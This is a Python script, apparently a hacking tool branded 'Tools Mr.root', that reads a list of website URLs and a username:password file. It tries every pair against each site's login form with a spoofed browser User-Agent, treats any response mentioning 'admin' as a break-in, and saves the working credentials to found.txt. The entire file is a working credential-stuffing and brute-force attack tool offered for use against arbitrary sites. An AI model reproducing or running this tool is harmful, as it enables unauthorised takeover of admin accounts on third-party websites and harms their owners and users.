import requests
import random
import string
import time
import os
from colorama import Fore, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

# Function to display welcome message with big font and colors
def show_welcome_message():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen
    welcome_text = pyfiglet.figlet_format("Tools Mr.root")
    print(Fore.CYAN + welcome_text)  # Print the welcome message in cyan
    time.sleep(2)  # Wait for 2 seconds before continuing

# Function to generate random usernames and passwords
def generate_random_userpass(num_entries):
    userpass_list = []
    for _ in range(num_entries):
        # Generate random username (8-12 characters)
        username_length = random.randint(8, 12)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))

        # Generate random password (8-12 characters)
        password_length = random.randint(8, 12)
        password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=password_length))

        # Append the username:password pair
        userpass_list.append(f"{username}:{password}")

    return userpass_list

# Function to attempt login with username and password
def attempt_login(url, username, password):
    login_data = {'username': username, 'password': password}  # Adjust depending on the website form
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }

    try:
        response = requests.post(url, data=login_data, headers=headers, timeout=10)  # POST request with timeout
        if response.status_code == 200 and "admin" in response.text.lower():  # Adjust the success criteria
            return True, response.text
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Request error: {e}")
    return False, None

# Function to handle the scanning process
def scan_sites(urls, credentials):
    found_sites = []
    
    for url in urls:
        url = url.strip()  # Clean up URL
        for username, password in credentials:
            print(Fore.YELLOW + f"Scanning {url} with username '{username}' and password '{password}'...")

            # Try to log in to the admin page of the site
            success, response_text = attempt_login(url, username, password)

            if success:
                print(Fore.GREEN + f"[+] Found valid credentials for {url} with username '{username}' and password '{password}'!")
                found_sites.append((url, username, password))  # Add the site and credentials to found_sites
                break  # Once a successful login is found for the site, stop further guessing
            else:
                print(Fore.RED + f"[-] Failed to log in to {url} with the provided credentials.")
    
    return found_sites

# Function to save the found sites to a file
def save_found_sites(found_sites):
    with open('found.txt', 'w') as file:
        for site, username, password in found_sites:
            file.write(f"{site} - Username: {username}, Password: {password}\n")
    print(Fore.CYAN + "[*] Results saved to found.txt")

# Function to read usernames and passwords from a file
def read_userpass_file(userpass_file):
    credentials = []
    try:
        with open(userpass_file, 'r') as file:
            for line in file.readlines():
                username, password = line.strip().split(':')  # Assuming format "username:password"
                credentials.append((username, password))
    except FileNotFoundError:
        print(Fore.RED + f"[!] The file '{userpass_file}' was not found!")
    return credentials

# Main function
def main():
    # Show welcome message
    show_welcome_message()

    # Ask for user input
    url_list_file = input(Fore.CYAN + "Enter the path to the URL list file (e.g., urls.txt): ").strip()
    userpass_file = input(Fore.CYAN + "Enter the path to the user:pass file (e.g., userpass.txt): ").strip()

    if not os.path.exists(url_list_file):
        print(Fore.RED + f"[!] The file '{url_list_file}' was not found!")
        return
    if not os.path.exists(userpass_file):
        print(Fore.RED + f"[!] The file '{userpass_file}' was not found!")
        return

    # Read the URL list from file
    with open(url_list_file, 'r') as file:
        urls = file.readlines()

    # Read the user:pass file
    credentials = read_userpass_file(userpass_file)
    if not credentials:
        print(Fore.RED + "[!] No valid credentials found in the file.")
        return

    # Start scanning
    print(Fore.YELLOW + "[*] Starting the login attempts...\n")
    found_sites = scan_sites(urls, credentials)

    # If found any valid sites
    if found_sites:
        print(Fore.GREEN + "\n[+] The following sites were successfully accessed:")
        for site, username, password in found_sites:
            print(Fore.GREEN + f"  - {site} with Username: {username} and Password: {password}")

        # Save results to found.txt
        save_found_sites(found_sites)
    else:
        print(Fore.RED + "[*] No valid credentials found.")

if __name__ == '__main__':
    main()
